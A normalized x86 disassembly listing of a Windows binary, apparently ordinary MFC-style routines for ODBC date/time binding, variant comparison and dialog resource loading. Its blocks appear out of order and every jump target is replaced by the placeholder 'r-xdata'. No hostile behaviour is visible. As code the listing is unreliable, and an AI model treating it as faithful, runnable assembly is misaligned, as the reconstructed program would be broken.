and al 0xef
add eax 0x10
mov [ ebx ] eax
mov esi [ esi + 0x4 ]
cmp [ esi + 0x84 ] edi
je r-xdata
mov eax [ esi + 0x4 ]
xor edi edi
cmp [ eax + 0x78 ] edi
jne r-xdata
mov eax [ esi + 0x4 ]
xor edi edi
cmp [ eax + 0x80 ] edi
je r-xdata
cmp [ ebx ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c6e
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c6e
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jne r-xdata
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
xor edi edi
mov [ ebp + 0xc ] esp
mov [ eax ] edi
call sub_425355
cmp eax edi
je r-xdata
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
xor edi edi
mov [ ebp - 0x8 ] esp
mov [ eax ] edi
call sub_425355
cmp eax edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx eax
mov edi [ ecx + 0x3c ]
shl edx 0x4
dec eax
lea edi [ edi + edx - 0x10 ]
mov dl [ edi + 0xc ]
push edx
push eax
call sub_423c45
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423ca5
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
shl ecx 0x4
mov eax [ eax + 0x3c ]
push 0x4
lea esi [ eax + ecx - 0x10 ]
call sub_441e89
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] 0x8
jmp r-xdata
mov eax [ esi + 0x4 ]
xor edi edi
cmp [ eax + 0x7c ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edi edi
xor ebx ebx
or [ eax ] 0xffffffff
jmp r-xdata
mov eax [ esi + 0x7c ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
push edi
mov esi [ eax + ecx * 4 - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x78 ]
cmp [ eax + ecx * 4 - 0x4 ] edi
jne r-xdata
mov eax [ eax + 0x14 ]
shl eax 0x2
push eax
call sub_441e89
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x78 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x14 ]
shl ecx 0x2
push ecx
push edi
push [ eax + 0x78 ]
call sub_42dc30
mov eax [ esi + 0x4 ]
add esp 0x10
mov ecx [ eax + 0x14 ]
mov [ eax + 0x80 ] ecx
mov eax [ eax + 0x78 ]
mov ecx [ ebp + 0x8 ]
push edi
mov ebx [ eax + ecx * 4 - 0x4 ]
mov ecx [ ebp + 0x10 ]
call sub_43b6c3
mov eax [ eax + 0x14 ]
mov ecx [ ebp + 0x10 ]
add eax 0x76c
push edi
mov [ ebx ] ax
call sub_43b6c3
mov eax [ eax + 0x10 ]
mov ecx [ ebp + 0x10 ]
inc eax
push edi
mov [ ebx + 0x2 ] ax
call sub_43b6c3
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x4 ] ax
call sub_43b6c3
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x6 ] ax
call sub_43b6c3
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x8 ] ax
call sub_43b6c3
mov eax [ eax ]
push 0x17
push 0x10
push 0xb
push [ ebp - 0x4 ]
mov [ ebx + 0xa ] ax
mov [ ebx + 0xc ] edi
push ebx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov esi [ ebp + 0x8 ]
mov eax [ ecx + 0x78 ]
mov eax [ eax + esi * 4 - 0x4 ]
mov dx [ eax ]
cmp dx 0x7b2
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
push [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
call sub_442524
mov ecx [ esi + 0x10 ]
push 0x3d
call sub_44254b
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
dec eax
mov edx [ ecx + 0x78 ]
push eax
mov ebx [ edx + eax * 4 ]
call sub_423ca5
xor edi edi
test eax eax
je r-xdata
cmp eax [ ebp + 0x10 ]
jne r-xdata
cmp [ esi + 0x8 ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c81
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
or [ ebx ] 0xffffffff
jmp r-xdata
push [ edi + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
push [ edi ]
call sub_4255a5
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor edi edi
mov eax [ eax + 0x78 ]
push edi
mov esi [ eax + ecx * 4 - 0x4 ]
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x7c ]
mov ebx [ eax + ecx * 4 - 0x4 ]
cmp ebx edi
jne r-xdata
mov eax [ eax + 0x18 ]
shl eax 0x2
push eax
call sub_441e89
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x7c ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
shl ecx 0x2
push ecx
push edi
push [ eax + 0x7c ]
call sub_42dc30
mov eax [ esi + 0x4 ]
add esp 0x10
mov ecx [ eax + 0x18 ]
mov [ eax + 0x84 ] ecx
push [ ebp - 0x4 ]
mov ax [ esi + 0x8 ]
push edi
push ebx
push edi
push 0x17
push 0xb
push 0xb
push eax
push [ ebp + 0x8 ]
push [ esi + 0x2c ]
call Ordinal_ODBC32_72
cmp ax di
je r-xdata
mov ecx ebx
call sub_43b6c3
mov eax [ eax + 0x14 ]
push edi
add eax 0x76c
mov ecx ebx
mov [ esi ] ax
call sub_43b6c3
mov eax [ eax + 0x10 ]
push edi
inc eax
mov ecx ebx
mov [ esi + 0x2 ] ax
call sub_43b6c3
mov eax [ eax + 0xc ]
push edi
mov ecx ebx
mov [ esi + 0x4 ] ax
call sub_43b6c3
mov eax [ eax + 0x8 ]
push edi
mov ecx ebx
mov [ esi + 0x6 ] ax
call sub_43b6c3
mov eax [ eax + 0x4 ]
push edi
mov ecx ebx
mov [ esi + 0x8 ] ax
call sub_43b6c3
mov eax [ eax ]
mov [ esi + 0xa ] ax
mov [ esi + 0xc ] edi
jmp r-xdata
mov eax [ esi + 0x4 ]
push ebx
push 0x10
mov edx [ eax + 0x78 ]
push [ edx + ecx * 4 - 0x4 ]
push 0xb
push ecx
push [ eax + 0x4 ]
call Ordinal_ODBC32_4
mov ecx [ esi + 0x4 ]
mov ebx eax
push ebx
mov eax [ ecx ]
call [ eax + 0x48 ]
test eax eax
jne r-xdata
push 0x10
call sub_441e89
mov edx [ ebp + 0x8 ]
pop ecx
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x78 ]
mov [ ecx + edx * 4 - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov ecx esi
call sub_42440c
dec esi
push esi
jmp r-xdata
cmp dx 0x7f6
jg r-xdata
mov ecx [ ebp + 0x10 ]
push edi
call sub_43b6c3
mov eax [ eax + 0x14 ]
mov ecx [ ebp + 0x10 ]
add eax 0x76c
push edi
mov [ ebx ] ax
call sub_43b6c3
mov eax [ eax + 0x10 ]
mov ecx [ ebp + 0x10 ]
inc eax
push edi
mov [ ebx + 0x2 ] ax
call sub_43b6c3
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x4 ] ax
call sub_43b6c3
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x6 ] ax
call sub_43b6c3
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x8 ] ax
call sub_43b6c3
mov eax [ eax ]
mov [ ebx + 0xc ] edi
mov [ ebx + 0xa ] ax
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
mov eax [ ebp - 0x4 ]
or [ eax ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x14 ] edi
mov eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
push edi
call sub_43b6c3
mov eax [ eax + 0x14 ]
mov ecx [ ebp + 0x10 ]
add eax 0x76c
push edi
mov [ ebx ] ax
call sub_43b6c3
mov eax [ eax + 0x10 ]
mov ecx [ ebp + 0x10 ]
inc eax
push edi
mov [ ebx + 0x2 ] ax
call sub_43b6c3
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x4 ] ax
call sub_43b6c3
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x6 ] ax
call sub_43b6c3
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
push edi
mov [ ebx + 0x8 ] ax
call sub_43b6c3
mov eax [ eax ]
mov [ ebx + 0xc ] edi
mov [ ebx + 0xa ] ax
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
push 0x10
call sub_441e89
mov ebx eax
mov eax [ esi + 0x4 ]
pop ecx
mov eax [ eax + 0x7c ]
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx * 4 - 0x4 ] ebx
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
add ecx 0x5c
jmp r-xdata
mov ecx [ esi + 0x4 ]
push [ esi + 0x2c ]
mov edx [ ecx ]
push eax
call [ edx + 0x54 ]
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
add ecx 0x40
mov ecx [ esi + 0x4 ]
push edi
push ebx
mov eax [ ecx ]
call [ eax + 0x54 ]
call sub_423cb8
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
jmp r-xdata
movzx ecx [ eax + 0xa ]
push 0xffffffff
push ecx
movzx ecx [ eax + 0x8 ]
push ecx
movzx ecx [ eax + 0x6 ]
push ecx
movzx ecx [ eax + 0x4 ]
movzx eax [ eax + 0x2 ]
push ecx
push eax
movsx eax dx
push eax
lea ecx [ ebp - 0x8 ]
call sub_43b5df
mov ecx [ ebp + 0x10 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
mov ecx [ esi + 0x10 ]
push 0x3f
call sub_44254b
push [ esi + 0x1c ]
mov ecx [ esi + 0x10 ]
call sub_442524
mov eax [ esi + 0x4 ]
push [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
inc [ esi + 0x28 ]
mov eax [ eax + 0x38 ]
push edi
shl ecx 0x4
push ebx
push edi
mov ax [ eax + ecx - 0xc ]
push 0x17
push eax
mov ax [ esi + 0x28 ]
push 0xb
push 0x1
push eax
push [ esi + 0x2c ]
call Ordinal_ODBC32_72
jmp r-xdata
mov eax [ esi + 0x4 ]
test [ eax + 0x2d ] 0x40
jne r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
mov [ ebx ] 0x10
jmp r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
push [ ebp + 0x10 ]
call sub_43d586
mov [ eax ] edi
jmp r-xdata
sub_425363
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx eax
shl ecx 0x4
mov edx [ edi + 0x3c ]
lea ebx [ eax - 0x1 ]
push ebx
lea esi [ edx + ecx - 0x10 ]
mov ecx edi
call sub_423c35
push ebx
mov ecx edi
mov [ esi + 0xc ] al
call sub_423ca5
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x8 ]
cmp eax 0x1
je r-xdata
push eax
lea eax [ ebp + 0x10 ]
push eax
push esi
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
cmp eax 0x4
je r-xdata
cmp eax 0x6
je r-xdata
push eax
lea eax [ ebp + 0x10 ]
push eax
push [ esi ]
jmp r-xdata
push [ ebp + 0x10 ]
call sub_4255a5
sub_4253cf
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx eax
shl ecx 0x4
mov edx [ edi + 0x3c ]
lea ebx [ eax - 0x1 ]
mov al [ edx + ecx - 0x4 ]
lea esi [ edx + ecx - 0x10 ]
push eax
push ebx
mov ecx edi
call sub_423c45
push ebx
mov ecx edi
call sub_423ca5
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
or [ eax ] 0xffffffff
mov eax [ esi + 0x8 ]
cmp eax 0x1
je r-xdata
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
jmp r-xdata
cmp eax 0x2
je r-xdata
call sub_4255a5
jmp r-xdata
cmp eax 0x3
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp eax 0x4
je r-xdata
cmp eax 0x6
je r-xdata
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ esi ]
sub_425446
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
xor esi esi
cmp eax 0x8
jg r-xdata
sub eax 0x9
je r-xdata
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + 0x8 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
dec eax
je r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0xc ]
call sub_425597
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0xc
push eax
push ecx
push edx
call sub_42dcf0
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_42d51e
pop ecx
pop ecx
jmp r-xdata
sub eax 0x5
je r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ecx ]
jmp r-xdata
dec eax
je r-xdata
push 0x1
pop esi
test eax eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
dec eax
je r-xdata
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov al [ eax ]
cmp al [ ecx ]
jmp r-xdata
dec eax
je r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
dec eax
jne r-xdata
dec eax
je r-xdata
mov dx [ eax + 0x4 ]
cmp dx [ ecx + 0x4 ]
jne r-xdata
fld [ eax ]
fcomp [ ecx ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call [ lstrcmpA@IAT ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov dx [ eax + 0x6 ]
cmp dx [ ecx + 0x6 ]
jne r-xdata
mov eax [ ebp + 0xc ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
jmp r-xdata
dec eax
jne r-xdata
mov dx [ eax + 0x8 ]
cmp dx [ ecx + 0x8 ]
jne r-xdata
fnstsw ax
sahf
jmp r-xdata
mov eax [ ebp + 0xc ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
jmp r-xdata
mov dx [ eax + 0xa ]
cmp dx [ ecx + 0xa ]
jne r-xdata
mov eax [ eax + 0xc ]
cmp eax [ ecx + 0xc ]
jmp r-xdata
sub_4255a5
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push 0x8
pop ecx
cmp eax ecx
jg r-xdata
sub eax 0x9
je r-xdata
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push esi
call sub_43d0ee
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
dec eax
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push esi
call sub_442281
mov eax [ esi ]
mov eax [ eax - 0x8 ]
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x10
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dx [ eax ]
mov [ ecx ] dx
mov dx [ eax + 0x2 ]
mov [ ecx + 0x2 ] dx
mov dx [ eax + 0x4 ]
mov [ ecx + 0x4 ] dx
mov dx [ eax + 0x6 ]
mov [ ecx + 0x6 ] dx
mov dx [ eax + 0x8 ]
mov [ ecx + 0x8 ] dx
mov dx [ eax + 0xa ]
mov [ ecx + 0xa ] dx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
dec eax
je r-xdata
pop esi
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov al [ eax ]
mov [ ecx ] al
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
fld [ eax ]
fstp [ ecx ]
mov eax [ eax + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
dec eax
jne r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call [ lstrcpyA@IAT ]
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ eax ]
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ eax ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
jmp r-xdata
sub_4256e9
push esi
mov esi ecx
mov eax [ esi + 0x24 ]
add eax 0x4
cmp eax [ esi + 0x28 ]
jbe r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
add [ esi + 0x24 ] 0x4
mov eax esi
pop esi
retn 0x4
call sub_447e14
sub_42570f
push esi
mov esi ecx
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
lea edx [ eax + 0x4 ]
cmp edx ecx
jbe r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ esp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
add [ esi + 0x24 ] 0x4
mov eax esi
pop esi
retn 0x4
sub eax ecx
mov ecx esi
add eax 0x4
push eax
call sub_447e90
sub_425741
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi ecx
push 0x1
mov ecx [ ebp + 0x8 ]
pop esi
test ecx ecx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
push 0x1002
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
pop edi
pop esi
leave
retn 0x4
lea eax [ ebp - 0x10 ]
push eax
call sub_43b6f2
test eax eax
je r-xdata
xor esi esi
sub_42577d
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push esi
push eax
push 0x0
push 0x1001
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn 0x4
lea eax [ ebp - 0x14 ]
push 0xffffffff
push eax
lea ecx [ ebp - 0x4 ]
call sub_43b62b
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
sub_4257ba
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
mov ecx esi
call sub_4493c2
push eax
call sub_43e7b3
cmp [ esi ] 0x0
pop esi
push [ esp + 0xc ]
mov ecx eax
je r-xdata
call sub_425741
call sub_42577d
jmp r-xdata
retn 0xc
sub_425838
mov ecx [ esp + 0x4 ]
xor edx edx
push ebx
push esi
cmp [ ecx + 0x2 ] 0xffff
mov ebx [ ecx ]
sete dl
test edx edx
je r-xdata
lea eax [ ecx + 0x12 ]
mov ebx [ ecx + 0xc ]
lea eax [ ecx + 0x1a ]
jmp r-xdata
add eax esi
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop esi
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax esi
test cx cx
je r-xdata
add eax 0x4
jmp r-xdata
mov cx [ eax ]
add eax esi
test cx cx
jne r-xdata
mov cx [ eax ]
jmp r-xdata
test bl 0x40
je r-xdata
add eax 0x3
pop esi
and al 0xfc
pop ebx
retn 0x4
neg edx
sbb edx edx
and edx esi
inc edx
lea eax [ eax + edx * 2 ]
mov cx [ eax ]
add eax esi
test cx cx
jne r-xdata
sub_4258be
cmp [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
je r-xdata
add eax 0x12
add eax 0x18
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop edx
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
movzx ecx [ eax ]
lea eax [ ecx + eax + 0x5 ]
and al 0xfc
retn 0x8
mov cx [ eax ]
jmp r-xdata
sub_42592a
mov eax sub_463989
call sub_42dc88
push ecx
push 0x54
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_426d40
sub_425961
mov eax sub_46399d
call sub_42dc88
push ecx
push 0xdc
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_4279af
sub_42599b
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov ebx ecx
cmp [ edi + 0x2 ] 0xffff
lea eax [ edi + 0x10 ]
je r-xdata
movzx eax [ eax ]
lea eax [ eax * 4 + 0x4 ]
push eax
call sub_42dd9c
mov esi [ esp + 0x14 ]
pop ecx
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
lea eax [ edi + 0x8 ]
pop edi
pop esi
pop ebx
retn 0x8
mov edx [ ebx ]
push eax
push edi
mov ecx ebx
call [ edx + 0x18 ]
test eax eax
mov [ esi ] eax
jne r-xdata
mov eax edi
sub_4259e5
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call [ GlobalFree@IAT ]
pop esi
retn 0x4
push esi
call sub_42ded6
pop ecx
sub_425a09
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_425838
mov ebx eax
mov ax [ esi + 0x2 ]
mov [ ebp - 0x10 ] ebx
sub ebx esi
xor ecx ecx
cmp ax 0xffff
sete cl
cmp ax 0xffff
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x10 ]
je r-xdata
movzx eax [ eax ]
and [ ebp - 0xc ] 0x0
mov esi [ ebp - 0x10 ]
test eax eax
mov [ ebp - 0x14 ] eax
jle r-xdata
lea eax [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
xor eax eax
jmp r-xdata
mov edi eax
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ecx ] 0x7b
jne r-xdata
lea ecx [ esi + 0x12 ]
mov ecx eax
sub ecx esi
add [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
push [ ebp - 0x4 ]
push esi
call sub_4258be
cmp [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
dec edi
mov esi eax
jne r-xdata
push [ ebp - 0x8 ]
push 0x0
call [ GlobalAlloc@IAT ]
push ebx
mov esi eax
push [ ebp + 0x8 ]
mov edi esi
push esi
call sub_42e2d0
add esp 0xc
add esi ebx
cmp [ edi + 0x2 ] 0xffff
mov [ ebp - 0x8 ] esi
lea eax [ edi + 0x10 ]
je r-xdata
and [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
lea eax [ edi + 0x8 ]
cmp [ eax ] 0x7b
jne r-xdata
lea eax [ ebx + 0x12 ]
sub esi ebx
push esi
push ebx
push [ ebp - 0x8 ]
call sub_42e2d0
add [ ebp - 0x8 ] esi
add esp 0xc
cmp [ edi + 0x2 ] 0xffff
lea eax [ edi + 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
inc [ eax ]
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
lea eax [ edi + 0x8 ]
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
jne r-xdata
push [ ebp - 0x4 ]
push ebx
call sub_4258be
cmp [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0xc ] esi
lea eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
or [ eax + ecx * 4 ] 0xffffffff
mov eax edi
sub_425b48
push ebx
push esi
push edi
xor edi edi
cmp [ esp + 0x14 ] edi
mov ebx ecx
je r-xdata
push 0x1
test edi edi
pop eax
je r-xdata
call sub_45357b
mov esi [ eax + 0xc ]
push 0xf0
push [ esp + 0x18 ]
push esi
call [ FindResourceA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0xc
push [ esp + 0x18 ]
mov eax [ ebx ]
mov ecx ebx
push edi
push [ esp + 0x18 ]
call [ eax + 0x1c ]
push eax
push esi
call [ LoadResource@IAT ]
test eax eax
je r-xdata
push eax
call [ LockResource@IAT ]
mov edi eax
sub_425ba3
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x14 ] ecx
push ebx
mov ecx [ ebp + 0x10 ]
xor ebx ebx
mov eax [ ecx ]
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ esi + 0x1c ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
pop ebx
leave
retn 0xc
mov ecx [ esi + 0x34 ]
cmp ecx ebx
je r-xdata
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ eax + 0x2 ] 0xffff
mov [ ebp - 0x4 ] 0x1
sete dl
cmp edi ebx
mov [ ebp - 0xc ] edx
je r-xdata
mov ecx [ ebp - 0x14 ]
push esi
call sub_425cfe
push ebx
call sub_4273c5
cmp [ edi ] bx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
inc edi
inc edi
mov ax [ edi ]
inc edi
inc edi
mov [ ebp - 0x1c ] eax
mov edx [ edi ]
add edi 0x4
cmp ax 0x376
mov [ ebp - 0x10 ] edx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esi [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov esi [ ecx + edx * 4 ]
inc edx
cmp esi ebx
mov [ ebp + 0xc ] edx
jne r-xdata
cmp ax 0x37a
je r-xdata
cmp esi 0xffffffff
je r-xdata
lea ebx [ ecx + edx * 4 ]
cmp ax 0x377
je r-xdata
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
push edi
push eax
push esi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_425e19
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ax 0x37b
je r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
push 0x2
push [ ebp + 0x10 ]
push 0x5
push [ ebp - 0x8 ]
jmp r-xdata
cmp ax 0x378
jne r-xdata
push ebx
call [ GetParent@IAT ]
